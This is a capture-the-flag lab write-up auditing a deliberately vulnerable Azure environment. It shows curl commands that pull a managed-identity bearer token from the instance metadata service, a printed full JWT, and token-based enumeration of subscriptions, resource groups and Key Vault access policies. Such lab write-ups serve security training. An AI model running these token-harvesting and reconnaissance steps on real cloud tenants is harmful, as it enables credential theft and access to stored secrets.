  <span class="md-ellipsis">
    Extras
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Extras
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../easter_eggs/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    Easter Eggs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../bonus/" class="md-nav__link">
        
  
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 3c-1.11 0-2 .89-2 2v14c0 1.11.89 2 2 2h14c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2H5m0 2h14v14H5V5m2 2v2h10V7H7m0 4v2h10v-2H7m0 4v2h7v-2H7Z"/></svg>
  
  <span class="md-ellipsis">
    BONUS - Fishing
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="active-directory">Active Directory<a class="headerlink" href="#active-directory" title="Permanent link">⚓︎</a></h1>
<p><strong>Difficulty</strong>: <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M316.9 18c-5.3-11-16.5-18-28.8-18s-23.4 7-28.8 18L195 150.3 51.4 171.5c-12 1.8-22 10.2-25.7 21.7s-.7 24.2 7.9 32.7L137.8 329l-24.6 145.7c-2 12 3 24.2 12.9 31.3s23 8 33.8 2.3l128.3-68.5 128.3 68.5c10.8 5.7 23.9 4.9 33.8-2.3s14.9-19.3 12.9-31.3L438.5 329l104.2-103.1c8.6-8.5 11.7-21.2 7.9-32.7s-13.7-19.9-25.7-21.7l-143.7-21.2L316.9 18z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M316.9 18c-5.3-11-16.5-18-28.8-18s-23.4 7-28.8 18L195 150.3 51.4 171.5c-12 1.8-22 10.2-25.7 21.7s-.7 24.2 7.9 32.7L137.8 329l-24.6 145.7c-2 12 3 24.2 12.9 31.3s23 8 33.8 2.3l128.3-68.5 128.3 68.5c10.8 5.7 23.9 4.9 33.8-2.3s14.9-19.3 12.9-31.3L438.5 329l104.2-103.1c8.6-8.5 11.7-21.2 7.9-32.7s-13.7-19.9-25.7-21.7l-143.7-21.2L316.9 18z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M316.9 18c-5.3-11-16.5-18-28.8-18s-23.4 7-28.8 18L195 150.3 51.4 171.5c-12 1.8-22 10.2-25.7 21.7s-.7 24.2 7.9 32.7L137.8 329l-24.6 145.7c-2 12 3 24.2 12.9 31.3s23 8 33.8 2.3l128.3-68.5 128.3 68.5c10.8 5.7 23.9 4.9 33.8-2.3s14.9-19.3 12.9-31.3L438.5 329l104.2-103.1c8.6-8.5 11.7-21.2 7.9-32.7s-13.7-19.9-25.7-21.7l-143.7-21.2L316.9 18z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M316.9 18c-5.3-11-16.5-18-28.8-18s-23.4 7-28.8 18L195 150.3 51.4 171.5c-12 1.8-22 10.2-25.7 21.7s-.7 24.2 7.9 32.7L137.8 329l-24.6 145.7c-2 12 3 24.2 12.9 31.3s23 8 33.8 2.3l128.3-68.5 128.3 68.5c10.8 5.7 23.9 4.9 33.8-2.3s14.9-19.3 12.9-31.3L438.5 329l104.2-103.1c8.6-8.5 11.7-21.2 7.9-32.7s-13.7-19.9-25.7-21.7l-143.7-21.2L316.9 18z"/></svg></span><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.5.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2023 Fonticons, Inc.--><path d="M287.9 0c9.2 0 17.6 5.2 21.6 13.5l68.6 141.3 153.2 22.6c9 1.3 16.5 7.6 19.3 16.3s.5 18.1-5.9 24.5L433.6 328.4 459.8 484c1.5 9-2.2 18.1-9.7 23.5s-17.3 6-25.3 1.7l-137-73.2L151 509.1c-8.1 4.3-17.9 3.7-25.3-1.7s-11.2-14.5-9.7-23.5l26.2-155.6L31.1 218.2c-6.5-6.4-8.7-15.9-5.9-24.5s10.3-14.9 19.3-16.3l153.2-22.6 68.6-141.3C270.4 5.2 278.7 0 287.9 0zm0 79-52.5 108.2c-3.5 7.1-10.2 12.1-18.1 13.3L99 217.9l85.9 85.1c5.5 5.5 8.1 13.3 6.8 21l-20.3 119.7 105.2-56.2c7.1-3.8 15.6-3.8 22.6 0l105.2 56.2-20.2-119.6c-1.3-7.7 1.2-15.5 6.8-21l85.9-85.1-118.3-17.5c-7.8-1.2-14.6-6.1-18.1-13.3L287.9 79z"/></svg></span><br/></p>
<h2 id="objective">Objective<a class="headerlink" href="#objective" title="Permanent link">⚓︎</a></h2>
<div class="admonition question">
<p class="admonition-title">Request</p>
<p>Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?</p>
</div>
<details class="quote">
<summary>Ribb Bonbowford</summary>
<p>Hello, I'm Ribb Bonbowford. Nice to meet you!<br/>
Oh golly! It looks like Alabaster deployed some vulnerable Azure Function App Code he got from ChatNPT.<br/>
Don't get me wrong, I'm all for testing new technologies. The problem is that Alabaster didn't review the generated code and used the Geese Islands Azure production environment for his testing.<br/>
I'm worried because our Active Directory server is hosted there and Wombley Cube's research department uses one of its fileshares to store their sensitive files.<br/>
I'd love for you to help with auditing our Azure and Active Directory configuration and ensure there's no way to access the research department's data.<br/>
Since you have access to Alabaster's SSH account that means you're already in the Azure environment. Knowing Alabaster, there might even be some useful tools in place already.</p>
</details>
<h2 id="hints">Hints<a class="headerlink" href="#hints" title="Permanent link">⚓︎</a></h2>
<details class="tip">
<summary>Useful Tools</summary>
<p>It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.</p>
</details>
<details class="tip">
<summary>Misconfiguration ADventures</summary>
<p>Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.</p>
</details>
<h2 id="solution">Solution<a class="headerlink" href="#solution" title="Permanent link">⚓︎</a></h2>
<div class="admonition note">
<p class="admonition-title">Reportinator tip</p>
<p>Listing 4: Azure CLI Command to Set Key Vault Secret<br/>
$ az keyvault secret set --vault-name vault-name --name secret-name --value secret-value<br/>
A proper remediation should result in an error message, such as:<br/>
AuthorizationFailed: The client client-id with object id object-id does not have authorization to perform action Microsoft.KeyVault/vaults/secrets/write over scope /subscriptions/subscription-id/resourceGroups/resource-group-name/providers/Microsoft.KeyVault/vaults/vault-name/secrets/secret-name or the scope is invalid.<br/></p>
</div>
<p>Once we gained access to Alabaster account We can see list of tools which might help us on auditing Azure AD enviroment.</p>
<p>First we obtain token from Metadata service:</p>
<div class="highlight"><pre><span></span><code>curl<span class="w"> </span><span class="s1">&#39;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fmanagement.azure.com%2F&#39;</span><span class="w"> </span>-H<span class="w"> </span>Metadata:true<span class="w"> </span>-s
</code></pre></div>
<div class="highlight"><span class="filename">RESPONSE with TOKEN</span><pre><span></span><code><span class="p">{</span><span class="nt">&quot;access_token&quot;</span><span class="p">:</span><span class="s2">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSIsImtpZCI6IjVCM25SeHRRN2ppOGVORGMzRnkwNUtmOTdaRSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDQxOTc1NjcsIm5iZiI6MTcwNDE5NzU2NywiZXhwIjoxNzA0Mjg0MjY3LCJhaW8iOiJFMlZnWU9ncjZKcjZJL3ZxWFRtMkI0cU1VclZiQUE9PSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJFSXp1Z2dHWWxVZXpNRWFPNmRrQ0JnIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.IWhezoNaO1CXWr3WxpLQ8fBXpot_rb_VnGQTpG3-5mA04JXOMLTTy0eyvcb-PVLktN0dIgLqaELrGJ4nnGI2vD79xXZMoSfBt4ov9Nbq3wPaLQChD2AEkBYHey5WjrTfdngP7Cuy1yKH7t1jIJEPIGmZaNRescVMHS9HO9rZAck7yq1gpTAtQRQaMQWuSTQAhTEPdVtuqUItPqpXoWu4U6fS8JOf9NNvAndtxl9xGgiWbjWtuubDWZdKT1bXo4talKTwHghfGOZRc7tp8GFMgB3Yrm3Z8UW402THs1l4FeiNaZlZBAmODyawFiYD6D4pYcnzW1C-HsY_6vBqbwKpfw&quot;</span><span class="p">,</span><span class="nt">&quot;client_id&quot;</span><span class="p">:</span><span class="s2">&quot;b84e06d3-aba1-4bcc-9626-2e0d76cba2ce&quot;</span><span class="p">,</span><span class="nt">&quot;expires_in&quot;</span><span class="p">:</span><span class="s2">&quot;84172&quot;</span><span class="p">,</span><span class="nt">&quot;expires_on&quot;</span><span class="p">:</span><span class="s2">&quot;1704284267&quot;</span><span class="p">,</span><span class="nt">&quot;ext_expires_in&quot;</span><span class="p">:</span><span class="s2">&quot;86399&quot;</span><span class="p">,</span><span class="nt">&quot;not_before&quot;</span><span class="p">:</span><span class="s2">&quot;1704197567&quot;</span><span class="p">,</span><span class="nt">&quot;resource&quot;</span><span class="p">:</span><span class="s2">&quot;https://management.azure.com/&quot;</span><span class="p">,</span><span class="nt">&quot;token_type&quot;</span><span class="p">:</span><span class="s2">&quot;Bearer&quot;</span><span class="p">}</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="err">curl</span><span class="w"> </span><span class="mi">-</span><span class="err">H</span><span class="w"> </span><span class="s2">&quot;Authorization: Bearer &lt;TOKEN&gt;&quot;</span><span class="w"> </span><span class="err">&#39;h</span><span class="kc">tt</span><span class="err">ps</span><span class="p">:</span><span class="c1">//management.azure.com/subscriptions?api-version=2022-12-01&#39; | python -m json.tool</span>
</code></pre></div>
<p>```json title=Output
{
    "value": [
        {
            "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64",
            "authorizationSource": "RoleBased",
            "managedByTenants": [],
            "tags": {
                "sans:application_owner": "SANS:R&amp;D",
                "finance:business_unit": "curriculum"
            },
            "subscriptionId": "2b0942f3-9bca-484b-a508-abdae2db5e64",
            "tenantId": "90a38eda-4006-4dd5-924c-6ca55cacc14d",
            "displayName": "sans-hhc",
            "state": "Enabled",
            "subscriptionPolicies": {
                "locationPlacementId": "Public_2014-09-01",
                "quotaId": "EnterpriseAgreement_2014-09-01",
                "spendingLimit": "Off"
            }
        }
    ],
    "count": {
        "type": "Total",
        "value": 1
    }
}
<div class="highlight"><pre><span></span><code>Now let&#39;s query resources groups for this subscription

```sh
curl -H &quot;Authorization: Bearer &lt;TOKEN&gt;&quot; &#39;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups?api-version=2020-01-01&#39; | python -m json.tool
</code></pre></div></p>
<p>```json title=OUTPUT
{
    "value": [
        {
            "id": "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1",
            "name": "northpole-rg1",
            "type": "Microsoft.Resources/resourceGroups",
            "location": "eastus",
            "tags": {},
            "properties": {
                "provisioningState": "Succeeded"
            }
        }
    ]
}
<div class="highlight"><pre><span></span><code>Now let&#39;s try to get list of KeyVaults

```sh
curl -X GET -H &quot;Authorization: Bearer &lt;Access-Token&gt;&quot; \
-H &quot;Content-Type: application/json&quot; \
https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01
| python -m json.tool
</code></pre></div></p>
<div class="highlight"><pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;value&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;northpole-it-kv&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Microsoft.KeyVault/vaults&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;location&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eastus&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
<span class="w">            </span><span class="nt">&quot;properties&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nt">&quot;sku&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nt">&quot;family&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="p">,</span>
<span class="w">                    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Standard&quot;</span>
<span class="w">                </span><span class="p">},</span>
<span class="w">                </span><span class="nt">&quot;tenantId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;accessPolicies&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
<span class="w">                </span><span class="nt">&quot;enabledForDeployment&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;enabledForDiskEncryption&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;enabledForTemplateDeployment&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;enableSoftDelete&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;softDeleteRetentionInDays&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">90</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;enableRbacAuthorization&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;vaultUri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://northpole-it-kv.vault.azure.net/&quot;</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;provisioningState&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Succeeded&quot;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;northpole-ssh-certs-kv&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Microsoft.KeyVault/vaults&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;location&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eastus&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
<span class="w">            </span><span class="nt">&quot;properties&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nt">&quot;sku&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nt">&quot;family&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="p">,</span>
<span class="w">                    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;standard&quot;</span>
<span class="w">                </span><span class="p">},</span>
<span class="w">                </span><span class="nt">&quot;tenantId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;accessPolicies&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">                    </span><span class="p">{</span>
<span class="w">                        </span><span class="nt">&quot;tenantId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;</span><span class="p">,</span>
<span class="w">                        </span><span class="nt">&quot;objectId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0bc7ae9d-292d-4742-8830-68d12469d759&quot;</span><span class="p">,</span>
<span class="w">                        </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                            </span><span class="nt">&quot;keys&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">                                </span><span class="s2">&quot;all&quot;</span>
<span class="w">                            </span><span class="p">],</span>
<span class="w">                            </span><span class="nt">&quot;secrets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">                                </span><span class="s2">&quot;all&quot;</span>
<span class="w">                            </span><span class="p">],</span>
<span class="w">                            </span><span class="nt">&quot;certificates&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">                                </span><span class="s2">&quot;all&quot;</span>
<span class="w">                            </span><span class="p">],</span>
<span class="w">                            </span><span class="nt">&quot;storage&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">                                </span><span class="s2">&quot;all&quot;</span>
<span class="w">                            </span><span class="p">]</span>
<span class="w">                        </span><span class="p">}</span>
<span class="w">                    </span><span class="p">},</span>
<span class="w">                    </span><span class="p">{</span>
<span class="w">                        </span><span class="nt">&quot;tenantId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;</span><span class="p">,</span>
<span class="w">                        </span><span class="nt">&quot;objectId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1b202351-8c85-46f1-81f8-5528e92eb7ce&quot;</span><span class="p">,</span>
<span class="w">                        </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">                            </span><span class="nt">&quot;secrets&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">                                </span><span class="s2">&quot;get&quot;</span>
<span class="w">                            </span><span class="p">]</span>
<span class="w">                        </span><span class="p">}</span>
<span class="w">                    </span><span class="p">}</span>
<span class="w">                </span><span class="p">],</span>
<span class="w">                </span><span class="nt">&quot;enabledForDeployment&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;enableSoftDelete&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;softDeleteRetentionInDays&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">90</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;vaultUri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://northpole-ssh-certs-kv.vault.azure.net/&quot;</span><span class="p">,</span>
<span class="w">                </span><span class="nt">&quot;provisioningState&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Succeeded&quot;</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">],</span>
<span class="w">    </span><span class="nt">&quot;nextLink&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01&amp;$skiptoken=bm9ydGhwb2xlLXNzaC1jZXJ0cy1rdg==&quot;</span>
<span class="p">}</span>
</code></pre></div>
<p>Ok, now let's try GET key vault "name": "northpole-it-kv", </p>
<div class="highlight"><pre><span></span><code>curl -H &quot;Authorization: Bearer &quot;https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv?api-version=2022-07-01 | python -m json.tool
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;northpole-it-kv&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Microsoft.KeyVault/vaults&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;location&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eastus&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{},</span>
<span class="w">    </span><span class="nt">&quot;systemData&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;createdBy&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;thomas@sanshhc.onmicrosoft.com&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;createdByType&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;User&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;createdAt&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2023-10-30T13:17:02.532Z&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;lastModifiedBy&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;thomas@sanshhc.onmicrosoft.com&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;lastModifiedByType&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;User&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;lastModifiedAt&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2023-10-30T13:17:02.532Z&quot;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;properties&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;sku&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nt">&quot;family&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;A&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Standard&quot;</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="nt">&quot;tenantId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;90a38eda-4006-4dd5-924c-6ca55cacc14d&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;accessPolicies&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
<span class="w">        </span><span class="nt">&quot;enabledForDeployment&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;enabledForDiskEncryption&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;enabledForTemplateDeployment&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;enableSoftDelete&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;softDeleteRetentionInDays&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">90</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;enableRbacAuthorization&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;vaultUri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://northpole-it-kv.vault.azure.net/&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;provisioningState&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Succeeded&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;publicNetworkAccess&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Enabled&quot;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<p>To access keyvault we will need new Auth Token vault</p>
<div class="highlight"><pre><span></span><code><span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Metadata: true&quot;</span><span class="w"> </span><span class="s2">&quot;http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://vault.azure.net&quot;</span>
</code></pre></div>
